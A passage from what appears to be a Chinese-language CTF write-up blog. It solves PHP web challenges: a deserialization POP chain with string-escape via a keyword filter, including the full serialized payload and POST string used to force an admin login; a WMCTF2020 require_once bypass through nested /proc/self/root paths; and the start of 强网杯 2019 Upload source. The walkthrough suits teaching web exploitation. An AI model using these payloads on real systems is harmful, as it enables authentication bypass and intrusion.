class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mysqli=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;mysqli-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先介绍2个函数咯，因为自己见的比较少：</p>
<ul>
<li><code>bind_param(&#39;s&#39;, $this-&gt;name);</code></li>
</ul>
<p>这个就是往sql语句对应的?中传值</p>
<ul>
<li><code>bind_result($idResult, $passwordResult);</code></li>
</ul>
<p>拿题目中的sql语句为例，选了id,password两个数据，那<code>$idResult</code>对应的就是id，<code>$passwordResult</code>对应password，假如结果有多个就是一个数组</p>
<p>这边lib是存在一个反序列化pop构造的，我第一遍做的时候忽略了updatehelper这个类，我看他说未完善我就忽略了，我是脑瘫<br><code>Updatehelper</code>的析构函数有<code>echo $sql</code>,假如这个sql为User对象，那就触发了<code>User::__toString</code>,这时需要nickname为Info对象，这样就触发了<code>Info::__call</code>,在call魔术方法里需要让CtrlCase为<code>dbCtrl</code>,这样可以触发<code>dbCtrl::login($sql)</code>，紧接着我们的思路是让<code>session[&#39;token&#39;]=&#39;admin&#39;</code>，这样下次随便登录，只要用户名为admin就会登录成功,然后$sql就是User类里的age属性，把age属性赋值为我们需要执行的语句即可：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>对应的就是这一段判断，我们让token为admin即可，构造pop时让dbCtrl的token为admin，pop如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;CtrlCase=<span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$q</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$q</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user1</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="variable">$user1</span>-&gt;age=<span class="string">&quot;select id,\&quot;202cb962ac59075b964b07152d234b70\&quot; from user where username=?&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> dbCtrl;</span><br><span class="line"><span class="variable">$db</span>-&gt;password=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$info</span>=<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$db</span>);</span><br><span class="line"><span class="variable">$user1</span>-&gt;nickname=<span class="variable">$info</span>;</span><br><span class="line"><span class="variable">$update</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$user1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$update</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>序列化后结果为：<code>O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&#125;</code><br>由于lib.php反序列化的是Info类，我们还需要把上述的pop加到Info类去触发<br>首先，Info类正常反序列化结构如下：<br><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:4:&quot;union&quot;O:12;s:8:&quot;nickname&quot;;s:1:&quot;a&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code><br>其次在序列化Info类的时候经过了safe函数的处理，会把union等字符替换为hacker，union变为hacker就多了1个字符，这就造成了字符逃逸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入点有两个，一个是age，一个是nickname，不用想肯定nickname更方便，因为位置靠后，我们需要插入如下数据：<br><code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&#125;</code><br>这样序列化后结果就是：<br><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:4:&quot;union&quot;O:12;s:464:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&#125;&quot;;s:1:&quot;a&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code><br>闭合掉了后面的结果，造成造成字符逃逸<br>上面nickname的长度为464，因此我们需要在前面多加464个union来使得格式规范<br>我们传参：<br><code>age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&#125;</code><br>之后去登录界面登录即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672909549223-c89daa10-38cc-4f44-a3d3-745c2bcad893.png" alt="image.png"><br>当然也有很多种其他解法，比如可以让sql语句为<code>select password,id from user where username=?</code>，并且在构造pop时，让token也为admin<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672909800148-11655471-29b1-4de8-913e-2186d2356d6b.png" alt="image.png"><br>这样在这一步就直接输出了password，我们直接登录即可，拿到的password是md5加密后的，需要解密一下（假如复杂一点就不能解密了，因此感觉这种方法不太好）<br>其他的还有用<code>update user set password=&quot;c4ca4238a0b923820dcc509a6f75849b&quot; where username=?</code>去更新密码的等等</p>
<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>考点:PHP require_once软链接绕过<br>在php中的文件包含中，当路径嵌套太多，如<code>/proc/self/rootproc/self/rootproc/self/rootproc/self/rootproc/self/rootproc/self/rootproc/self/rootproc/self/rootproc/self/root/var/www/html</code>这种形式，会造成php在哈希表中无法正确匹配导致绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码很简短，考点很简单，require_once只能包含一次，因此正常来说包含flag.php是无效的<br>这里就用上面的payload就行了，套多层，在linux中<code>/proc/self</code>表示当前进程<code>/proc/self/root</code>指的就是根目录</p>
<p>当然这一题还有其他解法，比如session条件竞争</p>
<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>考点: 代码审计 信息泄露 PHP反序列化<br>PS：在这里终于解决了我蚁剑无法使用的问题呜呜呜呜，是系统环境变量里的<code>http_proxy</code>没删掉！！！！！<br>首先有<a href="http://www.tar.gz源码文件，重要几个文件如下：">www.tar.gz源码文件，重要几个文件如下：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="keyword">new</span> <span class="title class_">Index</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;?post.email&quot;</span>) &amp;&amp; <span class="title function_ invoke__">input</span>(<span class="string">&quot;?post.password&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$email</span>=<span class="title function_ invoke__">input</span>(<span class="string">&quot;post.email&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;addslashes&quot;</span>);</span><br><span class="line">            <span class="variable">$password</span>=<span class="title function_ invoke__">input</span>(<span class="string">&quot;post.password&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;addslashes&quot;</span>);</span><br><span class="line">            <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>,<span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_info</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) === <span class="variable">$user_info</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="variable">$cookie_data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_info</span>));</span><br><span class="line">                    <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookie_data</span>,<span class="number">3600</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Login failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;email not registed!&#x27;</span>,<span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;email or password is null!&#x27;</span>,<span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span 